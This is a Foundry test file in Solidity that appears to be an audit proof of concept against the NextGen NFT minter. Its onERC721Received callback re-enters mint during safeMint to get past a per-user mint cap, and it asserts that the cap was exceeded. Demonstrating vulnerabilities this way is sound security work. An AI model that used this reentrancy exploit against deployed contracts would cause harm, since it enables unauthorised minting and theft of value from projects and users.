// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2, Vm} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../../smart-contracts/NFTdelegation.sol";
import {randomPool} from "../../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../../smart-contracts/NextGenCore.sol";
import {NextGenRandomizerNXT} from "../../smart-contracts/RandomizerNXT.sol";
import {NextGenMinterContract} from "../../smart-contracts/MinterContract.sol";
import {IMinterContract} from "../../smart-contracts/IMinterContract.sol";

contract Gen is Test {
    DelegationManagementContract public delegate;
    randomPool public rPool;
    NextGenAdmins public admin;
    NextGenCore public core;
    NextGenRandomizerNXT public randomizer;
    NextGenMinterContract public minter;
    Vm.Wallet user1 = vm.createWallet("user1");

    uint256 MAX_MINT_PER_USER = 1;

    event Log(string, uint);
    event Log(string, address);

    function setUp() public {
        bytes32 merkleProof;
        // merkleProof = new bytes[](1);
        // merkleProof[0] = 0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870;
        vm.deal(address(this), 20 ether); // flashloan

        delegate = new DelegationManagementContract();
        rPool = new randomPool();
        admin = new NextGenAdmins();
        core = new NextGenCore("Core", "721R", address(admin));
        randomizer = new NextGenRandomizerNXT(
            address(rPool),
            address(admin),
            address(core)
        );
        minter = new NextGenMinterContract(
            address(core),
            address(delegate),
            address(admin)
        );

        /** CREATE COLLECTION */
        string[] memory _collectionScript = new string[](1);
        _collectionScript[0] = "desc";
        core.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            _collectionScript
        );
        /** REGISTER ADMIN */
        admin.registerCollectionAdmin(1, user1.addr, true);

        // set max regular allowed int per user to 1
        core.setCollectionData(1, user1.addr, MAX_MINT_PER_USER, 100, 0);
        core.addMinterContract(address(minter));

        /** ADD RANDOMIZERS */
        core.addRandomizer(1, address(randomizer));

        minter.setCollectionCosts(
            1, // _collectionID
            .3 ether, // _collectionMintCost 1 eth
            .1 ether, // _collectionEndMintCost 0.1 eth
            10, // _rate
            300, // _timePeriod
            0, // _salesOptions
            address(0) // delegator.addr // delAddress
        );
        minter.initializeBurn(1, 1, true);

        bytes32 _merkleRoot = 0xafce44088f231d7026015da401493f1569d140e5de386fad3d146753d5350a32;
        vm.warp(block.timestamp + 300);
        minter.setCollectionPhases(
            1, // _collectionID
            0, // _allowlistStartTime
            0, //block.timestamp + 3000, // _allowlistEndTime
            block.timestamp, // _publicStartTime
            block.timestamp + 300, // _publicEndTime
            _merkleRoot // _merkleRoot
        );
    }

    /*********** ********** ************/
    /*********** REENTRANCY ************/
    /*********** ********** ************/

    /**
        safeMint checks for onERC721Received implementation on the receiver address
        by doing an external call where we can reenter.
    */
    uint256 loop = 0;
    function test_reenter_mint() public {
        _mint(address(this), 2 ether, 1);
        assert(core.balanceOf(address(this)) > MAX_MINT_PER_USER);
    }



    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        ++loop;
        if(loop < 5){
             _mint(address(this), 2 ether,loop);
        }

        return IERC721Receiver.onERC721Received.selector;
    }

    bytes32[] merkleProof;

    function _mint(address _to, uint _value, uint loop) public payable {
        merkleProof = new bytes32[](1);
        merkleProof[0] = 0x19e5952531384a811e98f9c7ec35209c06a2c91618a81847b2c137335b1e5605;

        minter.mint{value: _value}(
            1, /// _collectionID,
            1, /// _numberOfTokens,
            10, /// _maxAllowance,
            "nextgen", /// string  _tokenData,
            _to, /// _mintTo,
            merkleProof, ///  bytes32[] merkleProof,
            address(0x0), /// _delegator,
            loop //       /// _saltfun_o
        );
    }
}


interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}
